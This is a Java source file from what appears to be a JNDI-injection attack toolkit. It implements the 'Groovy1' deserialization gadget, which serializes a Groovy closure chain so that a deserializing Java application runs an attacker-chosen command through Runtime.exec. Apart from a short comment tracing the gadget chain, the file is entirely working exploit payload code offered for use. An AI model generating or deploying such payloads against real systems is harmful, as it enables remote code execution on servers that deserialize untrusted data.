package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.util.Map;

/**
 * Gadget chain:
 * 		ObjectInputStream.readObject()
 * 			PriorityQueue.readObject()
 * 				Comparator.compare() (Proxy)
 * 					ConvertedClosure.invoke()
 * 						MethodClosure.call()
 * 							...
 * 						  		Method.invoke()
 * 									Runtime.exec()
 *
 * 	Requires:
 * 		groovy
 */
public class Groovy1 implements ObjectPayload<InvocationHandler> {

    public byte[] getBytes(PayloadType type, String... param) throws Exception {
        String                  command = param[0];
        final ConvertedClosure  closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
        final Map               map     = Gadgets.createProxy(closure, Map.class);
        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);
        ByteArrayOutputStream   baous   = new ByteArrayOutputStream();
        ObjectOutputStream      oos     = new ObjectOutputStream(baous);
        oos.writeObject(handler);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }

    @Override
    public InvocationHandler getObject(String command) throws Exception {
        return null;
    }
}
